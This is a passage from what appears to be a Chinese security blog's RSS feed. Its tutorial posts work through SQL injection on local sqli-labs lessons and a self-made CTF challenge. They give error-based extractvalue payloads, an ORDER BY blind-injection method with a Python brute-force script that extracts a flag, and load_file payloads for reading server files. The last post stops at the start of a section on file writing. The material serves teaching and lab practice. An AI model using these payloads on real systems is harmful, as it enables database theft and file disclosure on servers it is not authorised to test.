&lt;p&gt;&lt;img src=&#34;image-20221002120406540.png&#34; alt=&#34;image-20221002120406540&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120420706.png&#34; alt=&#34;image-20221002120420706&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120434503.png&#34; alt=&#34;image-20221002120434503&#34;&gt;&lt;/p&gt;
&lt;p&gt;OK，那就可以有&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,version(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#与下面一句等效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,version(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002115341706.png&#34; alt=&#34;image-20221002115341706&#34;&gt;&lt;/p&gt;
&lt;p&gt;读表：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,(select group_concat(table_name)) from information_schema.tables where table_schema=database(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#与下面一句等效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002115558719.png&#34; alt=&#34;image-20221002115558719&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;另外一种Order-by-注入&#34;&gt;&lt;a href=&#34;#另外一种Order-by-注入&#34; class=&#34;headerlink&#34; title=&#34;另外一种Order by 注入&#34;&gt;&lt;/a&gt;另外一种Order by 注入&lt;/h2&gt;&lt;p&gt;ThreeZh1自己写了一个题来学习这一种order by注入。&lt;/p&gt;
&lt;p&gt;题目过滤了F1g3这个字段名。&lt;code&gt;在id=3时&lt;/code&gt;，F1g3字段存在flag的base16编码。(直接过滤Flag会更好)&lt;/p&gt;
&lt;p&gt;查询语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &amp;quot;.$id.&amp;quot;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为2&lt;/p&gt;
&lt;p&gt;因为过滤了F1ag这个字段名，我们不能直接用普通盲注的方式得到F1ag，所以就得使用一种特别的order by盲注。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120830210.png&#34; alt=&#34;image-20221002120830210&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个就是错误页面，意味着报错，那么大概率就是不带单引号的整型注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120931642.png&#34; alt=&#34;image-20221002120931642&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;尝试获取列数&#34;&gt;&lt;a href=&#34;#尝试获取列数&#34; class=&#34;headerlink&#34; title=&#34;尝试获取列数&#34;&gt;&lt;/a&gt;尝试获取列数&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by 3 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by 4 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取列数为3&lt;/p&gt;
&lt;h3 id=&#34;尝试获取数据库版本&#34;&gt;&lt;a href=&#34;#尝试获取数据库版本&#34; class=&#34;headerlink&#34; title=&#34;尝试获取数据库版本&#34;&gt;&lt;/a&gt;尝试获取数据库版本&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: oops,This is not the flag id &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,version() #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;既然，直接报错注入的方式不可行，那么我们换一种思路，用order by&lt;/p&gt;
&lt;p&gt;可以直接用order by 么？&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 order by extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;服，那就尝试先来排序。由于id=1、id=2时，都不是flag所对应的id，根据题目，我们知道flag在id=3所在行。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id=3 union select 1,2,3 order by 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=3 union select 4,2,3 order by 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 4 name: 3 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据这个差异，我们可以指定&lt;code&gt;按第二列&lt;/code&gt;来排序，并在select里猜测flag的首字符值。这样就可以不使用F1ag这个字段名就把值读出来。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=3 union select 1,&amp;#x27;6&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=3 union select 1,&amp;#x27;7&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;出现差别了，因为这里是首字符不等于’7’才会出现排序不一样，所以flag的第一个字符为’6’。&lt;/p&gt;
&lt;p&gt;按照这个思路，写出脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; id: 3 &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; name: threezh1 &amp;lt;/td&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; id: 1 &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; name: 3 &amp;lt;/td&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/threezh1/index.php?&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_flag&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;id=3 union select 1,&amp;#x27;&amp;#123;0&amp;#125;&amp;#x27;,3 order by 2&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(flag + j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			content = requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; content.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				flag = flag + temp &lt;span class=&#34;comment&#34;&gt;#使用上一次保存的字符添加到flag的尾部&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#print(flag)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = j &lt;span class=&#34;comment&#34;&gt;#保存这一次的&amp;quot;没有令回包出现变化&amp;quot;的字符（temp保证是最新的字符）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; j == &lt;span class=&#34;string&#34;&gt;&amp;#x27;Z&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			length = i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag is:&amp;quot;&lt;/span&gt;,flag,&lt;span class=&#34;string&#34;&gt;&amp;quot;length is:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_flag()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002124705182.png&#34; alt=&#34;image-20221002124705182&#34;&gt;&lt;/p&gt;
&lt;p&gt;附上源码查询&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&amp;#x27;6&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;1-6都是这个样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002125810127.png&#34; alt=&#34;image-20221002125810127&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&amp;#x27;7&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;到7的时候第一次变化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002125748813.png&#34; alt=&#34;image-20221002125748813&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以就是要记录何时第一次变化，然后把&lt;code&gt;上一次没有引起回包变化的字符&lt;/code&gt;添加到&lt;strong&gt;flag的尾部&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</guid>
            <title>SQL注入读写文件</title>
            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</link>
            <category>SQL注入探究</category>
            <pubDate>Sun, 02 Oct 2022 00:29:51 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之SQL注入读写文件&#34;&gt;&lt;a href=&#34;#SQL注入之SQL注入读写文件&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之SQL注入读写文件&#34;&gt;&lt;/a&gt;SQL注入之SQL注入读写文件&lt;/h1&gt;&lt;p&gt;本篇讲解SQL注入读写文件&lt;/p&gt;
&lt;p&gt;使用到的函数如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用条件：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A、必须有权限读取并且文件必须完全可读&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;B、欲读取文件必须在服务器上&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C、必须指定文件完整的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;D、欲读取文件必须小于 max_allowed_packet&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Less-1为例&lt;/p&gt;
&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h2&gt;&lt;p&gt;添加一个单引号：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005100344.png&#34; alt=&#34;image-20221002005100344&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005148813.png&#34; alt=&#34;image-20221002005148813&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试order-by注入&#34;&gt;&lt;a href=&#34;#尝试order-by注入&#34; class=&#34;headerlink&#34; title=&#34;尝试order by注入&#34;&gt;&lt;/a&gt;尝试order by注入&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unknown column &amp;#x27;4&amp;#x27; in &amp;#x27;order clause&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;读取文件&#34;&gt;&lt;a href=&#34;#读取文件&#34; class=&#34;headerlink&#34; title=&#34;读取文件&#34;&gt;&lt;/a&gt;读取文件&lt;/h2&gt;&lt;p&gt;一般获取服务器的绝对路径有两种方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过经验猜测和自己搭建的服务器同样的路径&lt;/li&gt;
&lt;li&gt;通过爆破手段得到&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里就演示一下本地服务器绝对路径&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=-11&amp;#x27; union select 1, 2, load_file(&amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-1\\index.php&amp;quot;) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005701120.png&#34; alt=&#34;image-20221002005701120&#34;&gt;&lt;/p&gt;
&lt;p&gt;显示比较混乱，原因是当读取到index.php之后返回给页面的是php语句，所以在页面显示的时候被php重复解析。&lt;/p&gt;
&lt;p&gt;我们转换Hex存储&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=-11&amp;#x27; union select 1, 2, Hex(load_file(&amp;quot;C:\\phpStudyB\\WWW\\sqli\\Less-1\\index.php&amp;quot;)) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005946274.png&#34; alt=&#34;image-20221002005946274&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来去BurpSuit，或者在线网站转码。这里选择&lt;strong&gt;BurpSuit&lt;/strong&gt;，选择&lt;code&gt;Decoder-Decode as.....-Ascii hex&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002010101190.png&#34; alt=&#34;image-20221002010101190&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;写入文件&#34;&gt;&lt;a href=&#34;#写入文件&#34; class=&#34;headerlink&#34; title=&#34;写入文件&#34;&gt;&lt;/a&gt;写入文件&lt;/h2&gt;&lt;p&gt;写入文件使用函数为：into outfile&lt;/p&gt;
&lt;p&gt;例子为Less-7&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002010552632.png&#34; alt=&#34;image-20221002010552632&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，如果仅是单引号注入则这里不应该报错。所以根据经验尝试加个括号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，一个小括号不够？那就再加一个&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-7/?id=1&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;成功不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么，使用order by确定列数&lt;/p&gt;
